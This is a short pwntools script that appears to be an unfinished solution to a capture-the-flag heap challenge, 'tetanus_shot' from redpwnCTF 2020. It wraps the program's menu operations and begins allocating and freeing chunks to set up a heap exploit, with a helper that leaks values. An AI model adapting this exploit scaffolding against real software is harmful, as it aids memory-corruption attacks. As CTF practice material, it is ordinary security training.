from pwn import *
#target=remote('2020.redpwnc.tf',31069)
target=process('./tetanus_shot')
elf=ELF('./tetanus_shot')
libc=elf.libc

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))
	print(target.recvuntil("> "))
	
def create(size):
	init(1)
	target.sendline(str(size))

def delete(index):
	init(2)
	target.sendline(str(index))

def edit(index,element,data):
	init(3)
	target.sendline(str(index))
	print(target.recvuntil("> "))
	target.sendline(str(element))
	print(target.recvuntil("> "))
	target.sendline(str(data))

def view(index,element):
	init(6)
	target.sendline(str(index))
	print(target.recvuntil("> "))
	target.sendline(str(element))
	print(target.recvuntil("Value: "))
	leak=int(target.recvline().strip("\n"))
	print(hex(leak))
	return int(hex(leak),16)

def append(index,n,data):
	init(5)
	target.sendline(str(index))
	print(target.recvuntil("> "))
	target.sendline(str(n))
	for i in range(n):
		print(target.recvline())
		target.sendline(str(data[i]))

def prepend(index,n,data):
	init(4)
	target.sendline(str(index))
	print(target.recvuntil("> "))
	target.sendline(str(n))
	for i in range(n):
		print(target.recvline())
		target.sendline(str(data[i]))
	
create(0x100)
for i in range(3):
        create(0x10)
delete(0)
for i in range(6):
        create(0x10)


target.interactive()


